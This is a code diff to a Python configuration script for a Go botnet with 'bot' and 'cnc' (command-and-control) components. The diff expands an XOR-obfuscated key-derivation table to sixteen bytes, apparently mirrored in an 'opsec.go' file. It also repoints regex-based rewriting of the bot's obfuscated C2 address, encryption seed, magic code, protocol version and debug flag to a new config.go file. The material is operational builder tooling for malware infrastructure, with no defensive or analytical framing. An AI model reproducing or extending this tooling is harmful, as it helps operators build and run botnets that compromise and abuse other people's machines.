@@ -175,13 +175,25 @@ def derive_key_py(seed: str) -> bytes:
     """Python implementation of key derivation (must match Go)"""
     import hashlib
 
-    # Must match Go's mew/mewtwo/celebi/jirachi functions
+    # Must match Go's 16 key derivation functions in opsec.go
     dk = bytes(
         [
-            0x31 ^ 0x64,  # mew()
-            0x72 ^ 0x17,  # mewtwo()
-            0x93 ^ 0xC6,  # celebi()
-            0xA4 ^ 0x81,  # jirachi()
+            0xCC ^ 0xA6,  # mew()
+            0xC3 ^ 0x91,  # mewtwo()
+            0x79 ^ 0xC0,  # celebi()
+            0x4F ^ 0xAA,  # jirachi()
+            0x51 ^ 0x80,  # shaymin()
+            0x75 ^ 0xD1,  # phione()
+            0x4B ^ 0x7C,  # manaphy()
+            0x87 ^ 0x86,  # victini()
+            0xFC ^ 0x7C,  # keldeo()
+            0xD2 ^ 0x54,  # meloetta()
+            0xE9 ^ 0xEC,  # genesect()
+            0x77 ^ 0xF1,  # diancie()
+            0x3B ^ 0x4C,  # hoopa()
+            0x3C ^ 0x9D,  # volcanion()
+            0x6C ^ 0x3C,  # magearna()
+            0x97 ^ 0x33,  # marshadow()
         ]
     )
 
@@ -337,11 +349,11 @@ def update_cnc_main_go(
 
 
 def update_bot_debug_mode(bot_path: str, debug_enabled: bool) -> bool:
-    """Update the debugMode variable in Bot main.go"""
-    main_go_path = os.path.join(bot_path, "main.go")
+    """Update the debugMode variable in Bot config.go"""
+    config_go_path = os.path.join(bot_path, "config.go")
 
     try:
-        with open(main_go_path, "r") as f:
+        with open(config_go_path, "r") as f:
             content = f.read()
 
         debug_value = "true" if debug_enabled else "false"
@@ -351,7 +363,7 @@ def update_bot_debug_mode(bot_path: str, debug_enabled: bool) -> bool:
             content,
         )
 
-        with open(main_go_path, "w") as f:
+        with open(config_go_path, "w") as f:
             f.write(content)
 
         return True
@@ -376,10 +388,10 @@ def update_bot_main_go(
     obfuscated_c2: str,
     crypt_seed: str,
 ):
-    """Update the Bot main.go file with new values"""
-    main_go_path = os.path.join(bot_path, "main.go")
+    """Update the Bot config.go file with new values"""
+    config_go_path = os.path.join(bot_path, "config.go")
 
-    with open(main_go_path, "r") as f:
+    with open(config_go_path, "r") as f:
         content = f.read()
 
     # Update gothTits (obfuscated C2)
@@ -394,17 +406,17 @@ def update_bot_main_go(
 
     # Update magicCode
     content = re.sub(
-        r'magicCode\s*=\s*"[^"]*"', f'magicCode       = "{magic_code}"', content
+        r'const magicCode\s*=\s*"[^"]*"', f'const magicCode = "{magic_code}"', content
     )
 
     # Update protocolVersion
     content = re.sub(
-        r'protocolVersion\s*=\s*"[^"]*"',
-        f'protocolVersion = "{protocol_version}"',
+        r'const protocolVersion\s*=\s*"[^"]*"',
+        f'const protocolVersion = "{protocol_version}"',
         content,
     )
 
-    with open(main_go_path, "w") as f:
+    with open(config_go_path, "w") as f:
         f.write(content)
 
     return True
@@ -622,19 +634,19 @@ def get_current_config(bot_path: str, cnc_path: str) -> dict:
     """Extract current configuration from source files"""
     config = {}
 
-    # Read bot/main.go
-    bot_main = os.path.join(bot_path, "main.go")
-    if os.path.exists(bot_main):
-        with open(bot_main, "r") as f:
+    # Read bot/config.go
+    bot_config = os.path.join(bot_path, "config.go")
+    if os.path.exists(bot_config):
+        with open(bot_config, "r") as f:
             content = f.read()
 
             # Extract magicCode
-            match = re.search(r'magicCode\s*=\s*"([^"]*)"', content)
+            match = re.search(r'const magicCode\s*=\s*"([^"]*)"', content)
             if match:
                 config["magic_code"] = match.group(1)
 
             # Extract protocolVersion
-            match = re.search(r'protocolVersion\s*=\s*"([^"]*)"', content)
+            match = re.search(r'const protocolVersion\s*=\s*"([^"]*)"', content)
             if match:
                 config["protocol_version"] = match.group(1)
 
